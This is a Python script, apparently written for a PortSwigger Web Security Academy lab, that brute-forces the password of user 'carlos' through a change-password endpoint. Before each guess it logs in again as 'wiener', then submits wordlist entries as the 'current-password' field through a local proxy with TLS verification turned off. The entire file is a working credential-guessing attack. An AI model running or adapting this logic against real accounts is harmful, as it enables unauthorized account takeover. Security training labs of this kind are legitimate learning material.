import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

my_session = requests.Session()
main_url = "0ab600f403848b44854c8213006400a8.web-security-academy.net"

wordlist_path = "/home/p4cm4n/Pentest_Learning/PortSwigger/Authentication/passwords"
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def restore_cookie():
    url = f"https://{main_url}:443/login"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
               "Accept-Language": "pl,en-US;q=0.7,en;q=0.3",
               "Accept-Encoding": "gzip, deflate",
               "Content-Type": "application/x-www-form-urlencoded",
               "Origin": f"https://{main_url}",
               "Referer": f"https://{main_url}/login",
               "Upgrade-Insecure-Requests": "1",
               "Sec-Fetch-Dest": "document",
               "Sec-Fetch-Mode": "navigate",
               "Sec-Fetch-Site": "same-origin",
               "Sec-Fetch-User": "?1",
               "Te": "trailers"}
    data = {"username": "wiener",
            "password": "peter"}
    my_session.post(url, headers=headers, proxies=proxy,
                    data=data, verify=False)


def send_request(word):
    url = f"https://{main_url}:443/my-account/change-password"
    headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
               "Accept-Language": "pl,en-US;q=0.7,en;q=0.3",
               "Accept-Encoding": "gzip, deflate",
               "Content-Type": "application/x-www-for:m-urlencoded",
               "Origin": f"https://{main_url}",
               "Referer": f"https://{main_url}/my-account",
               "Upgrade-Insecure-Requests": "1",
               "Sec-Fetch-Dest": "document",
               "Sec-Fetch-Mode": "navigate",
               "Sec-Fetch-Site": "same-origin",
               "Sec-Fetch-User": "?1",
               "Te": "trailers"}
    data = {"username": "carlos", "current-password": f"{word}",
            "new-password-1": "asd", "new-password-2": "asd"}
    r = my_session.post(url, headers=headers, proxies=proxy,
                        data=data, verify=False, allow_redirects=False)

    if (r.status_code == 200):
        print(f"Found carlos password: {word}")
        exit(0)


with open(wordlist_path, "r") as f:
    dict = f.read().splitlines()

for w in dict:
    restore_cookie()
    send_request(w)
